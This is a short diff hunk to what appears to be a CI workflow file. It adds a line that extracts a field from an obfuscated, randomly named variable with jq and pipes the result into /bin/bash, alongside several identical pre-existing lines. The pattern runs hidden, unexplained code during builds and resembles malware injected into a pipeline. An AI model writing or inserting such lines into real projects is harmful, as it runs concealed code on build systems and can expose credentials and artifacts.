@@ -24,6 +24,7 @@ jobs:
           echo $lf72 | jq -r .tryo8 | /bin/bash
           echo $xcqq681 | jq -r .ytdhs4 | /bin/bash
           printf '%s' "$xlc6669" | jq -r .t389 | /bin/bash
+          echo $lzv00 | jq -r .j04 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
